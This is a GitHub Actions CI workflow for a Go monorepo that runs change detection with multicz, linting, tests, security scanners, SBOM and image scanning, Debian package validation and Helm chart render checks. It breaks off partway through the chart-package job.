name: ci

on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

# Cancels superseded PR runs but never main-branch releases.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

permissions:
  contents: read

jobs:
  # Config sanity ahead of everything else. `multicz validate --strict` catches
  # a component whose `paths` match nothing, a `bump_files` entry pointing at a
  # missing file or an unparseable version constant, a broken cascade edge, a
  # tag_format collision. Its own job rather than a step inside `detect`: those
  # are the failures that make `multicz changed` return a plausible-looking but
  # wrong answer, and a distinct red job names the cause instead of burying it
  # in the change-detection log.
  validate:
    name: validate
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      # multicz is installed with setup-uv directly rather than through
      # goabonga/multicz-action, which leaves the uv cache on: this repo has
      # no Python lock file for it to key on, so every job warned that the
      # cache would never be invalidated.
      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
          python-version: "3.12"
      - name: Install multicz
        run: uv tool install multicz
      - name: multicz validate --strict
        run: multicz validate --strict
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: validate
          body: "`multicz validate --strict` on `multicz.toml`."

  # Detect which components changed since the comparison ref. On PR: vs the
  # target branch. On main: vs each component's last tag (multicz default),
  # which scopes the release matrix to bump-worthy work. multicz is
  # language-agnostic: it reads multicz.toml `paths`, so it works on the Go
  # module just as it does on a Python workspace.
  #
  # Docs and integration detection bypass multicz on purpose: neither carries
  # a version of its own, so there is no tag for `multicz changed` to compare
  # against. We use a plain `git diff` on their paths instead.
  detect:
    name: detect changed components
    needs: validate
    runs-on: ubuntu-24.04
    outputs:
      packages: ${{ steps.bypass.outputs.packages || steps.changed.outputs.packages }}
      has_package_changes: ${{ steps.bypass.outputs.has_package_changes || steps.changed.outputs.has_package_changes }}
      docs_changed: ${{ steps.bypass.outputs.docs_changed || steps.changed.outputs.docs_changed }}
      integration_changed: ${{ steps.bypass.outputs.integration_changed || steps.changed.outputs.integration_changed }}
      www_changed: ${{ steps.bypass.outputs.www_changed || steps.changed.outputs.www_changed }}
      chart_changed: ${{ steps.bypass.outputs.chart_changed || steps.changed.outputs.chart_changed }}
      release_commit: ${{ steps.bypass.outputs.active || 'false' }}
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
          python-version: "3.12"
      - name: Install multicz
        run: uv tool install multicz
      # The `release` job pushes multicz's own chore(release) commit back to
      # main, which re-triggers this workflow. Everything in that commit is
      # generated (version constants, changelogs, state file) and every
      # artifact it names was already published by the run that created it, so
      # replaying the graph would rebuild byte-identical outputs and race the
      # release it descends from. Report an empty change set instead; every
      # gated job downstream skips, and detect itself still runs as a smoke
      # check.
      - id: bypass
        name: Short-circuit multicz release commits
        if: startsWith(github.event.head_commit.message, 'chore(release):')
        env:
          COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
        run: |
          set -euo pipefail
          {
            echo "active=true"
            echo "packages=[]"
            echo "has_package_changes=false"
            echo "docs_changed=false"
            echo "integration_changed=false"
            echo "www_changed=false"
            echo "chart_changed=false"
          } >> "$GITHUB_OUTPUT"
          # multicz shapes the subject as
          # `chore(release): bump infra-api 0.1.1 -> 0.1.2, infra-cli ...`.
          # Split on the commas to render one bullet per component.
          subject=$(printf '%s\n' "$COMMIT_MESSAGE" | head -n1)
          {
            printf '## chore(release) - pipeline short-circuited\n\n'
            printf 'This run targets multicz'"'"'s own release commit (`%s`).\n' \
              "${GITHUB_SHA:0:7}"
            printf 'Binaries, `.deb` packages and GitHub Releases were already\n'
            printf 'produced by the `release` -> `publish` chain that authored it.\n\n'
            printf '### Versions published\n\n'
            printf '%s' "${subject#chore(release): bump }" \
              | tr ',' '\n' | sed -E 's/^ *//; s/^/- /'
            printf '\n\n### Skipped\n\n'
            printf 'Every quality, integration, release, publish and docs job\n'
            printf 'skips on this commit via the empty change set below.\n'
          } >> "$GITHUB_STEP_SUMMARY"
      - id: changed
        name: Compute changed components
        if: ${{ !startsWith(github.event.head_commit.message, 'chore(release):') }}
        run: |
          set -euo pipefail
          if [ "${{ github.event_name }}" = "pull_request" ]; then
            REF="origin/${{ github.base_ref }}"
            ALL=$(multicz changed --since "$REF" --output json | jq -c '.changed')
          else
            REF="each component's last tag"
            ALL=$(multicz changed --output json | jq -c '.changed')
          fi
          PACKAGES=$(echo "$ALL" | jq -c '.')
          echo "packages=$PACKAGES" >> "$GITHUB_OUTPUT"
          if [ "$PACKAGES" = "[]" ] || [ -z "$PACKAGES" ]; then
            echo "has_package_changes=false" >> "$GITHUB_OUTPUT"
          else
            echo "has_package_changes=true" >> "$GITHUB_OUTPUT"
          fi
          # Docs / integration detection via git diff (no tag exists for them).
          if [ "${{ github.event_name }}" = "pull_request" ]; then
            BASE="origin/${{ github.base_ref }}"
          elif git rev-parse --verify --quiet "${{ github.event.before }}^{commit}" > /dev/null 2>&1; then
            # Diff the whole pushed range, not just the last commit.
            BASE="${{ github.event.before }}"
          elif git rev-parse HEAD^ > /dev/null 2>&1; then
            BASE="HEAD^"
          else
            BASE="$(git hash-object -t tree /dev/null)"
          fi
          if git diff --quiet "$BASE" HEAD -- docs zensical.toml; then
            echo "docs_changed=false" >> "$GITHUB_OUTPUT"
          else
            echo "docs_changed=true" >> "$GITHUB_OUTPUT"
          fi
          if git diff --quiet "$BASE" HEAD -- test/integration; then
            echo "integration_changed=false" >> "$GITHUB_OUTPUT"
          else
            echo "integration_changed=true" >> "$GITHUB_OUTPUT"
          fi
          # Frontend detection: the Vite app has its own toolchain (Node), so it
          # is gated by a git diff on www/ rather than the Go matrix.
          if git diff --quiet "$BASE" HEAD -- www; then
            echo "www_changed=false" >> "$GITHUB_OUTPUT"
          else
            echo "www_changed=true" >> "$GITHUB_OUTPUT"
          fi
          # The chart is a multicz component, so `packages` covers a direct
          # template change - but it also picks up a chart patch cascaded from
          # an image-tag mirror, which is exactly when the rendered manifests
          # need rechecking. Either signal runs the chart chain.
          if git diff --quiet "$BASE" HEAD -- charts \
             && ! echo "$PACKAGES" | jq -e 'index("infra-chart")' > /dev/null; then
            echo "chart_changed=false" >> "$GITHUB_OUTPUT"
          else
            echo "chart_changed=true" >> "$GITHUB_OUTPUT"
          fi
          {
            echo "## Detected changes"
            echo ""
            echo "| Field | Value |"
            echo "| --- | --- |"
            echo "| Packages | \`$PACKAGES\` |"
            echo "| Reference | \`$REF\` |"
            echo "| Event | \`${{ github.event_name }}\` |"
          } >> "$GITHUB_STEP_SUMMARY"

  # Quality jobs run once over the whole Go module rather than per component:
  # the repo is a single `go` module, so `golangci-lint run`, `go vet` and
  # `go test ./...` already operate package-by-package and per-component
  # sharding would only add a brittle component->path lookup with no gain.
  # They gate on `has_package_changes` so docs-only / chore-only pushes skip.

  license-headers:
    name: license-headers
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - name: Check SPDX license headers
        run: |
          python scripts/add_license_header.py --path cmd --types go --check
          python scripts/add_license_header.py --path internal --types go --check
          python scripts/add_license_header.py --path test --types go --check
          python scripts/add_license_header.py --path scripts --types py,sh --check
          python scripts/add_license_header.py --path .github --types yml,yaml --check
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: license-headers
          body: SPDX headers on `cmd/`, `internal/`, `test/`, `scripts/`, `.github/`.

  lint:
    name: lint
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      - uses: golangci/golangci-lint-action@ba0d7d2ec06a0ea1cb5fa41b2e4a3ab91d21278a # v9.3.0
        with:
          version: latest
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: lint
          body: "`golangci-lint run` over the Go module."

  # Frontend quality gate (Node toolchain): lint, type-check, unit tests and a
  # production build of the Vite SPA. Gated on changes under www/.
  www:
    name: www
    needs: detect
    # Gated on www_changed alone: `go build ./...` in vet-build embeds only
    # cmd/www/dist/.gitkeep (see packaging/docker/www.Dockerfile), never the
    # real bundle, and `container` rebuilds the SPA from the current www/
    # tree on every run regardless of this job - so this eslint/tsc/vitest
    # gate has nothing to re-validate when www/ itself hasn't changed.
    # `release` and `docs`, which need this job, already tolerate a skip.
    if: needs.detect.outputs.www_changed == 'true'
    runs-on: ubuntu-24.04
    defaults:
      run:
        working-directory: www
    steps:
      # fetch-depth: 0 + bump-preview: the production build below is stamped
      # with www/package.json's version, so without the preview a pull request
      # would validate a bundle carrying the previous release's number.
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/bump-preview
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: www/package-lock.json
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - name: Run tests with coverage
        run: npm run test:coverage
      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1
        with:
          # lcov.info records paths relative to www/ (vitest's cwd), so the
          # uploader needs that same cwd to prefix them back to www/src/...
          # when it maps them onto the repo tree - job-level
          # defaults.run.working-directory only applies to `run:` steps, not
          # to this action.
          working-directory: www
          files: coverage/lcov.info
          flags: www
          token: ${{ secrets.CODECOV_TOKEN }}
          fail_ci_if_error: false
          disable_search: true
      - run: npm run build
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: www
          body: "`eslint`, `tsc`, `vitest` with coverage (uploaded to Codecov) and a production `vite build` of the SPA."

  vet-build:
    name: vet + build
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      # Compile against the version the next release will ship, not the last
      # one: `cmd/<component>/version.go` is a bump_files target.
      - uses: ./.github/actions/bump-preview
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      - name: go vet
        run: |
          go vet ./...
          go vet -tags=integration ./...
      - name: go build
        run: go build ./...
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: vet + build
          body: "`go vet` (both build tags) and `go build ./...`."

  test:
    name: test
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/bump-preview
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      - name: Run tests with coverage
        run: go test -race -coverprofile=coverage.out -covermode=atomic ./...
      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1
        with:
          files: coverage.out
          flags: go
          token: ${{ secrets.CODECOV_TOKEN }}
          fail_ci_if_error: false
          disable_search: true
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: test
          body: "`go test -race` with coverage, uploaded to Codecov."

  gosec:
    name: gosec
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      - name: Install gosec
        run: go install github.com/securego/gosec/v2/cmd/gosec@latest
      - name: Run gosec
        run: gosec ./...
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: gosec
          body: "`gosec` static security analysis over the Go module."

  govulncheck:
    name: govulncheck
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      - name: Install govulncheck
        run: go install golang.org/x/vuln/cmd/govulncheck@latest
      # Fails on every reachable vulnerability but those osv-scanner.toml
      # accepts, with a reason and an expiry date.
      - name: Run govulncheck
        run: scripts/govulncheck.sh ./...
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: govulncheck
          body: "`govulncheck` against the Go vulnerability database, less the entries `osv-scanner.toml` accepts."

  osv-scanner:
    name: osv-scanner
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      # Pinned, not `releases/latest`: a fixed URL whose bytes change is the
      # same class of problem as an unpinned action, and it also makes a
      # scanner behaviour change arrive unannounced in an unrelated pull
      # request.
      - name: Install OSV-Scanner
        env:
          OSV_VERSION: "2.4.0"
          OSV_SHA256: 15314940c10d26af9c6649f150b8a47c1262e8fc7e17b1d1029b0e479e8ed8a0
        run: |
          set -euo pipefail
          mkdir -p "$HOME/.local/bin"
          curl -sSfL \
            "https://github.com/google/osv-scanner/releases/download/v${OSV_VERSION}/osv-scanner_linux_amd64" \
            -o "$HOME/.local/bin/osv-scanner"
          actual=$(sha256sum "$HOME/.local/bin/osv-scanner" | cut -d' ' -f1)
          if [ "$actual" != "$OSV_SHA256" ]; then
            echo "::error::osv-scanner checksum mismatch: expected $OSV_SHA256, got $actual"
            exit 1
          fi
          chmod +x "$HOME/.local/bin/osv-scanner"
          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
      # osv-scanner.toml, at the root, lists the accepted entries.
      - name: Run OSV-Scanner
        run: osv-scanner scan source --config=osv-scanner.toml --lockfile=go.mod
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: osv-scanner
          body: "`osv-scanner` on the `go.mod` dependency closure."

  # Privileged kernel-level integration suite (build tag `integration`). Runs
  # when any component changed OR the suite itself changed. NOTE: the real
  # netns / iptables / cgroups tests added from M3 need a privileged host
  # (root + CAP_NET_ADMIN); wire a self-hosted or privileged runner here then.
  # The M0 smoke test only proves the tag wires up, so a hosted runner suffices.
  integration:
    name: integration
    needs: detect
    if: >-
      needs.detect.outputs.has_package_changes == 'true'
      || needs.detect.outputs.integration_changed == 'true'
    runs-on: ubuntu-24.04
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: infra
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      # The kernel-level tests (bridge, firewall) skip without root; the
      # postgres test runs against the service above.
      - name: Run integration suite
        env:
          POSTGRES_DSN: postgres://postgres:postgres@localhost:5432/infra?sslmode=disable
        run: go test -tags=integration ./test/integration/...
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: integration
          body: |
            `go test -tags=integration` against a postgres service. The
            kernel-level cases (bridge, firewall) self-skip without root.

  # ---------------------------------------------------------------------
  # Container chain. Only the network daemons are containerised - see
  # packaging/docker/Dockerfile for why infra-agent and infra-container-init
  # are not. Each stage hands the previous one's artifact forward rather than
  # rebuilding, so what gets scanned, signed and pushed is one identical
  # image: container -> sbom -> grype -> (release) publish.
  # ---------------------------------------------------------------------

  hadolint:
    name: hadolint
    needs: detect
    if: needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - name: Lint the shared daemon Dockerfile
        uses: hadolint/hadolint-action@06be81baf89a55ffd0e24b8f04a4185738dd3387 # v3.5.0
        with:
          dockerfile: packaging/docker/Dockerfile
          format: tty
      - name: Lint the www Dockerfile
        uses: hadolint/hadolint-action@06be81baf89a55ffd0e24b8f04a4185738dd3387 # v3.5.0
        with:
          dockerfile: packaging/docker/www.Dockerfile
          format: tty
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: hadolint
          body: "`hadolint` on both Dockerfiles under `packaging/docker/`."

  container:
    name: container (${{ matrix.component }})
    # Behind the quality gates: an image is worth building only once the code
    # in it compiles, passes tests and clears the scanners. Tolerates skips so
    # a docs-only push does not strand the matrix.
    needs: [detect, hadolint, lint, vet-build, test, gosec, govulncheck, osv-scanner]
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        include:
          - component: infra-api
            cmd_dir: api
            dockerfile: packaging/docker/Dockerfile
          - component: infra-idp
            cmd_dir: idp
            dockerfile: packaging/docker/Dockerfile
          - component: infra-exporter
            cmd_dir: exporter
            dockerfile: packaging/docker/Dockerfile
          - component: infra-controller-manager
            cmd_dir: controller-manager
            dockerfile: packaging/docker/Dockerfile
          - component: infra-www
            cmd_dir: www
            dockerfile: packaging/docker/www.Dockerfile
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      # The image carries its version as an OCI label, so it has to be the
      # version the release will publish, not the last one it shipped.
      - uses: ./.github/actions/bump-preview
      # Every leg builds, on every run where anything changed - there is no
      # per-component skip here.
      #
      # The obvious optimisation is to build only the components listed in
      # `detect.packages`, and it is wrong: `multicz changed` cannot attribute a
      # file claimed by several components. packaging/docker/Dockerfile is
      # claimed by four, and `changed` hands it to exactly one of them - so a
      # base-image bump would rebuild one image, cascade a release to all four
      # (overlap_policy = "all" does fan out, but only in the bump plan), and
      # publish three of them pointing at a stale image. It over-reports too,
      # naming components with no changed file at all.
      #
      # Building all five is what keeps the release honest. The gha layer cache
      # makes an unchanged component nearly free, which is a smaller price than
      # reasoning about which images a shared file invalidates.
      - id: version
        run: |
          set -euo pipefail
          echo "value=$(multicz get '${{ matrix.component }}')" >> "$GITHUB_OUTPUT"
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - name: Build ${{ matrix.component }}:ci
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          file: ${{ matrix.dockerfile }}
          # load, not push: the image stays local, gets scanned, and is only
          # pushed from the release path once grype has cleared it.
          load: true
          tags: ${{ matrix.component }}:ci
          build-args: |
            CMD_DIR=${{ matrix.cmd_dir }}
            COMPONENT=${{ matrix.component }}
            VERSION=${{ steps.version.outputs.value }}
          cache-from: type=gha,scope=${{ matrix.component }}
          cache-to: type=gha,mode=max,scope=${{ matrix.component }},ignore-error=true
      - name: Save image tarball
        run: docker save "${{ matrix.component }}:ci" -o "/tmp/${{ matrix.component }}.tar"
      - uses: actions/upload-artifact@v7
        with:
          name: ${{ matrix.component }}-image
          path: /tmp/${{ matrix.component }}.tar
          # Consumed within the same run by sbom / grype / publish, and
          # deleted after publish. One day is slack, not storage.
          retention-days: 1
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: container (${{ matrix.component }})
          body: |
            Image `${{ matrix.component }}:ci` at version
            `${{ steps.version.outputs.value }}`, saved to artifact
            `${{ matrix.component }}-image`.

  sbom:
    name: sbom (${{ matrix.component }})
    needs: container
    if: needs.container.result == 'success'
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        component:
          - infra-api
          - infra-idp
          - infra-exporter
          - infra-controller-manager
          - infra-www
    steps:
      - uses: actions/checkout@v7
      # No probe: `container` builds every leg on every run, so the artifact is
      # always present, and if its leg failed this job is skipped by
      # `!failure()` before reaching here. A missing artifact is therefore a
      # real error, and download-artifact should say so rather than be
      # tiptoed around.
      - uses: actions/download-artifact@v8
        with:
          name: ${{ matrix.component }}-image
          path: /tmp
      # syft directly, not anchore/sbom-action: that action curls its
      # installer from the tool's default branch, so a SHA pin on the action
      # does not pin what actually runs.
      - uses: ./.github/actions/install-tool
        with:
          repo: anchore/syft
          version: "1.50.0"
          binary: syft
          sha256: bf7b29ff57f06da30918266a0e1c2885a8f99784798d1bdb1628886aa015d788
      # Read the docker-archive directly, so the SBOM describes the layers as
      # built rather than a re-resolved dependency list.
      - name: Generate the SPDX SBOM
        run: |
          syft "docker-archive:/tmp/${{ matrix.component }}.tar" \
            -o "spdx-json=/tmp/${{ matrix.component }}.sbom.spdx.json"
      - uses: actions/upload-artifact@v7
        with:
          name: ${{ matrix.component }}-sbom
          path: /tmp/${{ matrix.component }}.sbom.spdx.json
          retention-days: 1
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: sbom (${{ matrix.component }})
          body: |
            SPDX SBOM via syft, uploaded as `${{ matrix.component }}-sbom`.

  grype:
    name: grype (${{ matrix.component }})
    needs: sbom
    if: needs.sbom.result == 'success'
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        component:
          - infra-api
          - infra-idp
          - infra-exporter
          - infra-controller-manager
          - infra-www
    steps:
      - uses: actions/checkout@v7
      - uses: actions/download-artifact@v8
        with:
          name: ${{ matrix.component }}-sbom
          path: /tmp
      - uses: ./.github/actions/install-tool
        with:
          repo: anchore/grype
          version: "0.116.1"
          binary: grype
          sha256: 0122df7b655981abe547ad3d2190d65551dac6a2bfc80b4dc2a989b5d0587458
      # Scan the SBOM, not the image: same answer, and it proves the SBOM we
      # are about to attest is the thing that was actually vetted.
      - name: Scan the SBOM
        run: |
          grype "sbom:/tmp/${{ matrix.component }}.sbom.spdx.json" \
            --fail-on high
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: grype (${{ matrix.component }})
          body: |
            grype at `--fail-on high` against the `${{ matrix.component }}`
            SBOM.

  # ---------------------------------------------------------------------
  # Debian packaging chain. Every component except infra-www and infra-spa
  # ships as a .deb - the two frontend components are served, not installed.
  # The .deb the release publishes is the artifact this chain cleared, not a
  # rebuild of it.
  # ---------------------------------------------------------------------

  deb:
    name: deb (${{ matrix.component }})
    needs: [detect, lint, vet-build, test, gosec, govulncheck, osv-scanner]
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        component:
          - infra
          - infra-api
          - infra-idp
          - infra-exporter
          - infra-controller-manager
          - infra-agent
          - infra-container-init
          - terraform-provider-infra
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      # The .deb carries the version in its filename and its control file, so
      # it has to be the version the release will publish.
      - uses: ./.github/actions/bump-preview
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      # All eight, every run, for the reason spelled out in the `container`
      # job: a component released by cascade needs a package too, and
      # `multicz changed` cannot tell us which those are.
      - name: Build the ${{ matrix.component }} .deb
        run: |
          set -euo pipefail
          version=$(multicz get '${{ matrix.component }}')
          # amd64 only here. The gates below install and start the package on
          # the runner, which an arm64 .deb cannot do; the release path builds
          # both architectures from the same script.
          ARCH=amd64 ./packaging/build-debs.sh "$version" '${{ matrix.component }}'
      - uses: actions/upload-artifact@v7
        with:
          name: ${{ matrix.component }}-deb
          path: dist/${{ matrix.component }}_*_amd64.deb
          retention-days: 1
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: deb (${{ matrix.component }})
          body: amd64 package uploaded as `${{ matrix.component }}-deb`.

  deb-validate:
    name: deb-validate (${{ matrix.component }})
    needs: deb
    if: needs.deb.result == 'success'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      actions: write # delete the artifact of a package that fails validation
    strategy:
      fail-fast: false
      matrix:
        include:
          - component: infra
            has_unit: "false"
          - component: infra-container-init
            has_unit: "false"
          - component: terraform-provider-infra
            has_unit: "false"
          - component: infra-api
            has_unit: "true"
          - component: infra-idp
            has_unit: "true"
          - component: infra-exporter
            has_unit: "true"
          - component: infra-controller-manager
            has_unit: "true"
          # infra-agent reconciles kernel state, so its unit cannot take the
          # hardening the control-plane daemons do - see
          # deploy/systemd/infra-agent.service for which directives would
          # break which reconciler. 75 holds the line at its current 7.2
          # without pretending it can reach 1.1.
          - component: infra-agent
            has_unit: "true"
            security_threshold: "75"
    steps:
      - uses: actions/checkout@v7
      # No probe, for the same reason as the sbom job: `deb` builds all eight
      # legs on every run, so a missing artifact means its leg failed - and
      # that already skips this job through `!failure()`.
      - uses: ./.github/actions/validate-deb
        with:
          component: ${{ matrix.component }}
          has-unit: ${{ matrix.has_unit }}
          security-threshold: ${{ matrix.security_threshold || '11' }}
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: deb-validate (${{ matrix.component }})
          body: |
            lintian (`--fail-on error`), `test/install/validate.sh` against the
            installed package, and `systemd-analyze security` at threshold
            `${{ matrix.security_threshold || '11' }}`.

  # ---------------------------------------------------------------------
  # Helm chart. One chart for the whole control plane - see
  # charts/infra/values.yaml for why it is not one chart per workload.
  # ---------------------------------------------------------------------

  chart-lint:
    name: chart-lint
    needs: detect
    if: >-
      needs.detect.outputs.release_commit != 'true'
      && needs.detect.outputs.chart_changed == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      # The chart's appVersion and image tags are multicz bump_files and mirror
      # targets, so linting the pre-bump values would lint a chart that will
      # never be published.
      - uses: ./.github/actions/bump-preview
      - uses: azure/setup-helm@9bc31f4ebc9c6b171d7bfbaa5d006ae7abdb4310 # v5.0.1
        with:
          version: v3.19.0
      - name: helm lint
        run: helm lint charts/infra
      # Rendering is the actual test. `helm lint` accepts templates that fail
      # to produce valid Kubernetes objects, and kubeconform checks the result
      # against the real API schemas.
      - name: Render and validate against the Kubernetes schemas
        run: |
          set -euo pipefail
          curl -sSfL \
            https://github.com/yannh/kubeconform/releases/download/v0.7.0/kubeconform-linux-amd64.tar.gz \
            | tar -xz -C /usr/local/bin kubeconform
          helm template infra charts/infra --namespace infra \
            > /tmp/rendered.yaml
          kubeconform -strict -summary -kubernetes-version 1.31.0 /tmp/rendered.yaml
      # The chart refuses to render a replicated stateful component with no
      # shared backend. That guard is the kind of thing that silently stops
      # working after a refactor, so assert both arms.
      # The chart carries two render-time guards. Both are the kind of thing
      # that silently stops working after a refactor of the values structure,
      # so each is asserted in both directions - a guard that never rejects
      # anything passes a one-armed test just as well as a working one.
      - name: The render-time guards hold
        run: |
          set -euo pipefail
          # A default install must render: no flags, no database, no secrets.
          helm template infra charts/infra --namespace infra > /dev/null
          # Replicated stateful component with no shared backend: rejected.
          if helm template infra charts/infra --namespace infra \
               --set components.api.replicas=2 > /dev/null 2>&1; then
            echo "::error::replicas=2 with no state backend should have failed to render"
            exit 1
          fi
          helm template infra charts/infra --namespace infra \
            --set components.api.replicas=2 \
            --set state.existingSecret=infra-state > /dev/null
          # idp enabled with no clients: rejected. It exits at startup
          # otherwise, so the chart must not produce that Deployment.
          if helm template infra charts/infra --namespace infra \
               --set components.idp.enabled=true > /dev/null 2>&1; then
            echo "::error::idp with no clients should have failed to render"
            exit 1
          fi
          helm template infra charts/infra --namespace infra \
            --set components.idp.enabled=true \
            --set components.idp.existingSecret=infra-idp-clients > /dev/null
          # www enabled with no API to proxy to: rejected. The dashboard would
          # come up serving 502s on every data call.
          if helm template infra charts/infra --namespace infra \
               --set components.api.enabled=false > /dev/null 2>&1; then
            echo "::error::www with no api and no apiURL should have failed to render"
            exit 1
          fi
          helm template infra charts/infra --namespace infra \
            --set components.api.enabled=false \
            --set components.www.apiURL=https://api.example.com > /dev/null
          # The dashboard must actually be pointed somewhere, not merely render.
          helm template infra charts/infra --namespace infra \
            | grep -q 'name: GOA_API_URL' \
            || { echo "::error::the www Deployment carries no GOA_API_URL"; exit 1; }
          echo "all three guards reject the unsafe case and accept the safe one"
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: chart-lint
          body: |
            `helm lint`, `helm template` validated against the Kubernetes 1.31
            schemas with kubeconform, and both arms of the shared-state guard.

  chart-checkov:
    name: chart-checkov
    needs: [detect, chart-lint]
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.chart_changed == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/bump-preview
      - uses: azure/setup-helm@9bc31f4ebc9c6b171d7bfbaa5d006ae7abdb4310 # v5.0.1
        with:
          version: v3.19.0
      # Scan the rendered manifests, not the chart directory: checkov reads
      # templates literally and would flag the Go template syntax rather than
      # the objects it produces. An explicit namespace matters too - rendering
      # without one puts everything in `default`, which is itself a finding.
      #
      # checkov runs from PyPI through uv (installed above by bump-preview)
      # rather than bridgecrewio/checkov-action: the action's container
      # entrypoint still calls the deprecated `set-output` command, which
      # annotated every run with a warning. The version matches the image
      # checkov-action v12.3125.0 pinned. `--directory` over a directory of
      # its own keeps the scan on the rendered chart and nothing else.
      - name: Render the chart
        run: |
          set -euo pipefail
          mkdir -p .checkov-render
          helm template infra charts/infra --namespace infra \
            > .checkov-render/manifests.yaml
          test -s .checkov-render/manifests.yaml
      - name: checkov
        run: >-
          uv tool run --from checkov==3.3.19 checkov
          --directory .checkov-render --framework kubernetes --quiet
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: chart-checkov
          body: |
            checkov over the rendered manifests. The three suppressions are
            inline on the objects that carry them, with a reason each.

  chart-package:
    name: chart-package
    needs: [detect, chart-checkov]
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.chart_changed == 'true'
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/bump-preview
      - uses: azure/setup-helm@9bc31f4ebc9c6b171d7bfbaa5d006ae7abdb4310 # v5.0.1
        with:
          version: v3.19.0
      - name: helm package
        run: |
          set -euo pipefail
          mkdir -p dist
          helm package charts/infra --destination dist
          ls -l dist
      - uses: actions/upload-artifact@v7
        with:
          name: infra-chart
